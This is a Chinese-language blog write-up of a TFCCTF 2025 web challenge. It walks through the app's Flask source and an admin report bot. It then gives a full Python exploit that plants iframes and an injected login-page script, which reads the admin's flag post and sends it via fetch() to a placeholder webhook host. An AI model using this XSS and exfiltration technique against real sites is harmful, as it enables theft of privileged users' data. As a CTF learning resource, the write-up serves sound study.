<p>用户注册登录后，可以创建 Post ，创建好之后可以浏览，也可以通过点击 Report to Admin 触发机器人访问该Post</p>
<style>.hohhypbxdhki{zoom:80%;}</style><img src="/2025/09/02/TFCCTF2025/image-20250902204726339.png" class="hohhypbxdhki" alt="image-20250902204726339">

<p>flag被管理员写在了Post中，只有管理员或者机器人可通过 <code>/post/0</code> 访问</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ADMIN_USERNAME = secrets.token_hex(<span class="number">32</span>)</span><br><span class="line">ADMIN_PASSWORD = secrets.token_hex(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">users = &#123;ADMIN_USERNAME: ADMIN_PASSWORD&#125;</span><br><span class="line">posts = [&#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;author&quot;</span>: ADMIN_USERNAME,</span><br><span class="line">    <span class="string">&quot;title&quot;</span>: <span class="string">&quot;FLAG&quot;</span>,</span><br><span class="line">    <span class="string">&quot;description&quot;</span>: FLAG,</span><br><span class="line">    <span class="string">&quot;hidden&quot;</span>: <span class="literal">True</span></span><br><span class="line">&#125;]</span><br></pre></td></tr></table></figure>

<p>目标是让机器人访问存放flag的页面： <code>post/0</code> ，然后再想办法获取flag</p>
<p><strong>二、题目分析</strong></p>
<p>用户登录之后，可以创建Post</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/create_post&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_post</span>():</span><br><span class="line">    title = request.form[<span class="string">&quot;title&quot;</span>]</span><br><span class="line">    description = request.form[<span class="string">&quot;description&quot;</span>]   <span class="comment"># 获取用户输入的 description</span></span><br><span class="line">    hidden = request.form.get(<span class="string">&quot;hidden&quot;</span>) == <span class="string">&quot;on&quot;</span>  <span class="comment"># Checkbox in form for hidden posts</span></span><br><span class="line">    post_id = <span class="built_in">len</span>(posts)</span><br><span class="line">    posts.append(&#123;   // 将用户的该post条目加入posts</span><br><span class="line">        <span class="string">&quot;id&quot;</span>: post_id,</span><br><span class="line">        <span class="string">&quot;author&quot;</span>: session[<span class="string">&quot;username&quot;</span>],   <span class="comment"># author是session[username]</span></span><br><span class="line">        <span class="string">&quot;title&quot;</span>: title,</span><br><span class="line">        <span class="string">&quot;description&quot;</span>: description,</span><br><span class="line">        <span class="string">&quot;hidden&quot;</span>: hidden</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;index&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>用户可以访问自己创建的笔记</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/post/&lt;int:post_id&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">post_page</span>(<span class="params">post_id</span>):</span><br><span class="line">    <span class="comment"># 判断访问的id是否存在</span></span><br><span class="line">    post = <span class="built_in">next</span>((p <span class="keyword">for</span> p <span class="keyword">in</span> posts <span class="keyword">if</span> p[<span class="string">&quot;id&quot;</span>] == post_id), <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> post:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Post not found&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="comment"># 判断用户是否设置可见 且 判断用户是否为作者</span></span><br><span class="line">    <span class="keyword">if</span> post.get(<span class="string">&quot;hidden&quot;</span>) <span class="keyword">and</span> post[<span class="string">&quot;author&quot;</span>] != session[<span class="string">&quot;username&quot;</span>]:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Unauthorized&quot;</span>, <span class="number">403</span></span><br><span class="line">    <span class="comment"># 若id存在 且 用户为作者，将post（包含用户输入title和description）传入render_template函数</span></span><br><span class="line">    resp = make_response(render_template(<span class="string">&quot;post.html&quot;</span>, post=post))</span><br><span class="line">    resp.headers[<span class="string">&quot;Content-Security-Policy&quot;</span>] = <span class="string">&quot;script-src &#x27;none&#x27;; style-src &#x27;self&#x27;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br></pre></td></tr></table></figure>

<p>用户访问 <code>/report</code> 页面时会触发机器人访问</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/report&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">report</span>():</span><br><span class="line">    url = request.form.get(<span class="string">&#x27;url&#x27;</span>)   <span class="comment"># 获取data部分的url</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Missing url&#x27;</span>, <span class="number">400</span></span><br><span class="line">    <span class="comment"># 创建线程执行 run_admin_bot 函数</span></span><br><span class="line">    Thread(target=_run_admin_bot, args=(url,), daemon=<span class="literal">True</span>).start()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Report queued&#x27;</span>, <span class="number">202</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_run_admin_bot</span>(<span class="params">target_url: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 将 url 作为参数传递给bot</span></span><br><span class="line">        bot.run_report(target_url, ADMIN_USERNAME, ADMIN_PASSWORD)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[BOT] Done&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[BOT] Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>bot <code>report</code>操作实际是以管理员身份登录和访问待 <code>report</code> 的 <code>url</code></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">run_report</span>(<span class="params">url, username, password</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        driver = webdriver.Chrome(service=service, options=options)</span><br><span class="line">        <span class="comment"># 1.以管理员身份登录</span></span><br><span class="line">        driver.get(<span class="string">f&quot;http://127.0.0.1:5000/login?username=<span class="subst">&#123;username&#125;</span>&amp;password=<span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="comment"># Wait until page is loaded (document.readyState == &quot;complete&quot;)</span></span><br><span class="line">        WebDriverWait(driver, <span class="number">10</span>).until(</span><br><span class="line">            <span class="keyword">lambda</span> d: d.execute_script(<span class="string">&quot;return document.readyState&quot;</span>) == <span class="string">&quot;complete&quot;</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 2.访问 report page url</span></span><br><span class="line">        driver.get(url)</span><br><span class="line">        WebDriverWait(driver, <span class="number">10</span>).until(</span><br><span class="line">            <span class="keyword">lambda</span> d: d.execute_script(<span class="string">&quot;return window.reportReady === true&quot;</span>)</span><br><span class="line">        )</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Report page fully loaded&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>结合 <code>flag</code> 存放在管理员的 <code>post/0</code> 中，突破点在触发机器人执行report，以管理员的身份登录之后去访问某个<code>url</code>，若该<code>url</code>包含恶意链接，使得机器人在访问时将其<code>cookie</code>或者之前访问 <code>post/0</code> 的内容带出来，即可获得<code>flag</code></p>
<p><code>exp</code>如下：</p>
<p>注：<code>credentialless</code> 的核心作用是：让 iframe 请求不带 cookie，适用于跨域信息泄露场景</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">URL = <span class="string">&quot;https://webless-156e7e4ba10d8dc9.challs.tfcctf.com&quot;</span></span><br><span class="line"></span><br><span class="line">solution = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;iframe src=&quot;/post/0&quot;&gt;&lt;/iframe&gt;</span></span><br><span class="line"><span class="string">&lt;iframe credentialless src=&quot;/login?username=&lt;script&gt;fetch(`https://WEBHOOOK/$&#123;btoa(top.window.frames[0].document.body.innerText.substr(20))&#125;`)&lt;/script&gt;&amp;password=a&quot;&gt;&lt;/iframe&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">s.post(URL+<span class="string">&quot;/register&quot;</span>, data=&#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;test&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;test&quot;</span>&#125;)</span><br><span class="line">s.post(URL+<span class="string">&quot;/create_post&quot;</span>, data=&#123;<span class="string">&quot;title&quot;</span>: <span class="string">&quot;LEAK&quot;</span>, <span class="string">&quot;description&quot;</span>: solution, <span class="string">&quot;hidden&quot;</span>: <span class="string">&quot;off&quot;</span>&#125;)</span><br><span class="line">s.post(URL+<span class="string">&quot;/report&quot;</span>, data=&#123;<span class="string">&quot;url&quot;</span>: <span class="string">&quot;http://127.0.0.1:5000/post/1&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Check the webhook&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>poyload</code>的解释如下：</p>
<p>用户创建的post中包含solution，</p>
<p>当bot通过<code>&quot;http://127.0.0.1:5000/post/1&quot;</code> 访问时，返回的页面中包含solution；bot首先会访问 <code>src=“post/0”</code> ，然后会访问 <code>src=&quot;/login?username=&lt;script&gt;fetch(......)$&#123;btoa(top.window.frames[0].document.body.innerText.substr(20))&#125;</code></p>
<p>在访问后者时会获取前一帧显示的内容的前20个字符，将通过base64编码后发送到<code>https://WEBHOOOK</code>，即将flag的值发送出来了</p>
<p><img src="/image-20250902224454450.png" alt="image-20250902224454450"></p>
<h3 id="WEB-DOM"><a href="#WEB-DOM" class="headerlink" title="WEB-DOM"></a>WEB-DOM</h3><p>参考链接：<a target="_blank" rel="noopener" href="https://github.com/Eclso/Eclso.github.io/blob/11bb3cbcd4d305a895efd57c96979b6cc90d6519/_posts/2025-09-1-TFCCTF-DOM-Notify.md">https://github.com/Eclso/Eclso.github.io/blob/11bb3cbcd4d305a895efd57c96979b6cc90d6519/_posts/2025-09-1-TFCCTF-DOM-Notify.md</a></p>
<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/dom-based/dom-clobbering">https://portswigger.net/web-security/dom-based/dom-clobbering</a></p>
<p>server响应配置：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;&quot;name&quot;: &quot;invalid-value&quot;, &quot;observedAttribute&quot;: &quot;aria-label&quot;&#125;]</span><br></pre></td></tr></table></figure>

<p><img src="/image-20250910160934444.png" alt="image-20250910160934444"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/09/02/TFCCTF2025/" data-id="cuidX075fnWBRvwCLE5XdvuNu" data-title="TFCCTF2025 web" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/11/">November 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/10/">October 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/09/">September 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/08/">August 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">November 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2025/11/19/ciscn2019%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA%E5%8C%BA%E5%9F%9F%E8%B5%9B/">(no title)</a>
          </li>
        
          <li>
            <a href="/2025/11/19/cakectf2022/">(no title)</a>
          </li>
        
          <li>
            <a href="/2025/11/19/2025crewctf/">(no title)</a>
          </li>
        
          <li>
            <a href="/2025/11/19/2025%E7%9C%8B%E9%9B%AAkctf/">(no title)</a>
          </li>
        
          <li>
            <a href="/2025/11/18/n1ctfjunior-re/">n1ctfjunior-re</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2025 xrivendell7<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>